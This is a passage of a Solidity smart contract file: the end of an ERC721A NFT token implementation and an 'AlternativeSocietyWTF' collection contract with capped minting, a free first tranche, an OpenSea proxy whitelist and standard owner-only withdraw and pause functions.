1092         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1093         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1094         unchecked {
1095             _addressData[to].balance += uint64(quantity);
1096             _addressData[to].numberMinted += uint64(quantity);
1097 
1098             _ownerships[startTokenId].addr = to;
1099             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1100 
1101             uint256 updatedIndex = startTokenId;
1102             uint256 end = updatedIndex + quantity;
1103 
1104             if (safe && to.isContract()) {
1105                 do {
1106                     emit Transfer(address(0), to, updatedIndex);
1107                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1108                         revert TransferToNonERC721ReceiverImplementer();
1109                     }
1110                 } while (updatedIndex != end);
1111                 // Reentrancy protection
1112                 if (_currentIndex != startTokenId) revert();
1113             } else {
1114                 do {
1115                     emit Transfer(address(0), to, updatedIndex++);
1116                 } while (updatedIndex != end);
1117             }
1118             _currentIndex = updatedIndex;
1119         }
1120         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1121     }
1122 
1123     /**
1124      * @dev Transfers `tokenId` from `from` to `to`.
1125      *
1126      * Requirements:
1127      *
1128      * - `to` cannot be the zero address.
1129      * - `tokenId` token must be owned by `from`.
1130      *
1131      * Emits a {Transfer} event.
1132      */
1133     function _transfer(
1134         address from,
1135         address to,
1136         uint256 tokenId
1137     ) private {
1138         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1139 
1140         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1141             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1142             getApproved(tokenId) == _msgSender());
1143 
1144         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1145         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1146         if (to == address(0)) revert TransferToZeroAddress();
1147 
1148         _beforeTokenTransfers(from, to, tokenId, 1);
1149 
1150         // Clear approvals from the previous owner
1151         _approve(address(0), tokenId, prevOwnership.addr);
1152 
1153         // Underflow of the sender's balance is impossible because we check for
1154         // ownership above and the recipient's balance can't realistically overflow.
1155         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1156         unchecked {
1157             _addressData[from].balance -= 1;
1158             _addressData[to].balance += 1;
1159 
1160             _ownerships[tokenId].addr = to;
1161             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1162 
1163             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1164             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1165             uint256 nextTokenId = tokenId + 1;
1166             if (_ownerships[nextTokenId].addr == address(0)) {
1167                 // This will suffice for checking _exists(nextTokenId),
1168                 // as a burned slot cannot contain the zero address.
1169                 if (nextTokenId < _currentIndex) {
1170                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1171                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1172                 }
1173             }
1174         }
1175 
1176         emit Transfer(from, to, tokenId);
1177         _afterTokenTransfers(from, to, tokenId, 1);
1178     }
1179 
1180     /**
1181      * @dev Destroys `tokenId`.
1182      * The approval is cleared when the token is burned.
1183      *
1184      * Requirements:
1185      *
1186      * - `tokenId` must exist.
1187      *
1188      * Emits a {Transfer} event.
1189      */
1190     function _burn(uint256 tokenId) internal virtual {
1191         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1192 
1193         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1194 
1195         // Clear approvals from the previous owner
1196         _approve(address(0), tokenId, prevOwnership.addr);
1197 
1198         // Underflow of the sender's balance is impossible because we check for
1199         // ownership above and the recipient's balance can't realistically overflow.
1200         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1201         unchecked {
1202             _addressData[prevOwnership.addr].balance -= 1;
1203             _addressData[prevOwnership.addr].numberBurned += 1;
1204 
1205             // Keep track of who burned the token, and the timestamp of burning.
1206             _ownerships[tokenId].addr = prevOwnership.addr;
1207             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1208             _ownerships[tokenId].burned = true;
1209 
1210             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1211             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1212             uint256 nextTokenId = tokenId + 1;
1213             if (_ownerships[nextTokenId].addr == address(0)) {
1214                 // This will suffice for checking _exists(nextTokenId),
1215                 // as a burned slot cannot contain the zero address.
1216                 if (nextTokenId < _currentIndex) {
1217                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1218                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1219                 }
1220             }
1221         }
1222 
1223         emit Transfer(prevOwnership.addr, address(0), tokenId);
1224         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1225 
1226         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1227         unchecked {
1228             _burnCounter++;
1229         }
1230     }
1231 
1232     /**
1233      * @dev Approve `to` to operate on `tokenId`
1234      *
1235      * Emits a {Approval} event.
1236      */
1237     function _approve(
1238         address to,
1239         uint256 tokenId,
1240         address owner
1241     ) private {
1242         _tokenApprovals[tokenId] = to;
1243         emit Approval(owner, to, tokenId);
1244     }
1245 
1246     /**
1247      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1248      *
1249      * @param from address representing the previous owner of the given token ID
1250      * @param to target address that will receive the tokens
1251      * @param tokenId uint256 ID of the token to be transferred
1252      * @param _data bytes optional data to send along with the call
1253      * @return bool whether the call correctly returned the expected magic value
1254      */
1255     function _checkContractOnERC721Received(
1256         address from,
1257         address to,
1258         uint256 tokenId,
1259         bytes memory _data
1260     ) private returns (bool) {
1261         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1262             return retval == IERC721Receiver(to).onERC721Received.selector;
1263         } catch (bytes memory reason) {
1264             if (reason.length == 0) {
1265                 revert TransferToNonERC721ReceiverImplementer();
1266             } else {
1267                 assembly {
1268                     revert(add(32, reason), mload(reason))
1269                 }
1270             }
1271         }
1272     }
1273 
1274     /**
1275      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1276      * And also called before burning one token.
1277      *
1278      * startTokenId - the first token id to be transferred
1279      * quantity - the amount to be transferred
1280      *
1281      * Calling conditions:
1282      *
1283      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1284      * transferred to `to`.
1285      * - When `from` is zero, `tokenId` will be minted for `to`.
1286      * - When `to` is zero, `tokenId` will be burned by `from`.
1287      * - `from` and `to` are never both zero.
1288      */
1289     function _beforeTokenTransfers(
1290         address from,
1291         address to,
1292         uint256 startTokenId,
1293         uint256 quantity
1294     ) internal virtual {}
1295 
1296     /**
1297      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1298      * minting.
1299      * And also called after one token has been burned.
1300      *
1301      * startTokenId - the first token id to be transferred
1302      * quantity - the amount to be transferred
1303      *
1304      * Calling conditions:
1305      *
1306      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1307      * transferred to `to`.
1308      * - When `from` is zero, `tokenId` has been minted for `to`.
1309      * - When `to` is zero, `tokenId` has been burned by `from`.
1310      * - `from` and `to` are never both zero.
1311      */
1312     function _afterTokenTransfers(
1313         address from,
1314         address to,
1315         uint256 startTokenId,
1316         uint256 quantity
1317     ) internal virtual {}
1318 }
1319 
1320 
1321 
1322 contract AlternativeSocietyWTF is ERC721A, Owneable {
1323 
1324     string public baseURI;
1325     
1326     string public constant baseExtension = "";
1327     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1328 
1329     uint256 public constant MAX_PER_TX = 20;
1330     uint256 public constant MAX_SUPPLY = 6666;
1331     uint256 public constant price = 0.006 ether;
1332 
1333     bool public paused = false;
1334 
1335     constructor() ERC721A("alternativesociety.wtf", "JIMMY") {}
1336 
1337     function mint(uint256 _amount) external payable {
1338         address _caller = _msgSender();
1339         require(!paused, "Paused");
1340         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1341         require(_amount > 0, "No 0 mints");
1342         require(tx.origin == _caller, "No contracts");
1343         require(totalSupply() < 666 ? 1 >= _amount : MAX_PER_TX >= _amount , "Excess max per paid tx");
1344             require(totalSupply() < 666 ? _amount * 0 == msg.value : _amount * price == msg.value, "Invalid funds provided");
1345 
1346         _safeMint(_caller, _amount);
1347     }
1348 
1349     /**
1350         6 D1CS
1351     */
1352 
1353     function isApprovedForAll(address owner, address operator)
1354         override
1355         public
1356         view
1357         returns (bool)
1358     {
1359         // Whitelist OpenSea proxy contract for easy trading.
1360         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1361         if (address(proxyRegistry.proxies(owner)) == operator) {
1362             return true;
1363         }
1364 
1365         return super.isApprovedForAll(owner, operator);
1366     }
1367 
1368     function withdraw() external onlyOwner {
1369         uint256 balance = address(this).balance;
1370         (bool success, ) = _msgSender().call{value: balance}("");
1371         require(success, "Failed to send");
1372     }
1373 
1374     function setupOS() external onlyOwner {
1375         _safeMint(_msgSender(), 1);
1376     }
1377 
1378     function pause(bool _state) external onlyOwner {
1379         paused = _state;
1380     }
1381 
1382     function setBaseURI(string memory baseURI_) external onlyOwner {
1383         baseURI = baseURI_;
1384     }
1385 
1386     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1387         require(_exists(_tokenId), "Token does not exist.");
1388         return bytes(baseURI).length > 0 ? string(
1389             abi.encodePacked(
1390               baseURI,
1391               Strings.toString(_tokenId),
1392               baseExtension
1393             )
1394         ) : "";
1395     }
1396 }
1397 
1398 contract OwnableDelegateProxy { }
1399 contract ProxyRegistry {
1400     mapping(address => OwnableDelegateProxy) public proxies;
1401 }